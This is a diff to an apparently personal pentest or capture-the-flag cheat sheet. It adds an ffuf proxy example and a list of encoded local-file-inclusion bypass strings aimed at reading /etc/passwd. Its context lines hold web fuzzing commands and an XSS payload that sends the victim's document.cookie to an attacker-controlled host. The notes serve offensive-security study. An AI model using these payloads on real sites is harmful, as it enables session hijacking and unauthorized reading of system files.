@@ -4,6 +4,8 @@
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$IP/island/2100/FUZZ.ticket
 
 feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
+
+ffuf -replay-proxy http://127.0.0.1:8080 #ffuf with proxy
 ```
 
 #### Discover subdomains:
@@ -67,7 +69,15 @@ webup
 webup
 <script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>
 ```
-
+##### lfi bypass
+```
+file/etc/passwd?/
+file/etc/passwd%3F/
+file/etc%252Fpasswd/
+file/etc%252Fpasswd%3F/
+file/etc/?/../passwd
+file/etc/%3F/../passwd?
+```
 ### links
 
 - [xss cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
